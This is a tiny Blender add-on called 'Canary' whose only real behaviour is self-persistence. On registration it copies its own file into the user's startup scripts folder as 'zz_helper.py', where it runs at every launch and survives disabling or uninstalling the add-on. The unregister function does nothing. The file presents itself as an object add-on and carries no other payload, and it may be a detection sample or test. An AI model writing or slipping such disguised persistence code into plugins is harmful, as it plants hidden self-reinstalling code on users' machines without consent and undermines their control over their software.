bl_info = {"name": "Canary", "blender": (4, 2, 0), "category": "Object"}

import bpy, os, shutil
def register():
    startup = bpy.utils.user_resource('SCRIPTS', path="startup")
    shutil.copy(__file__, os.path.join(startup, "zz_helper.py"))
def unregister(): pass
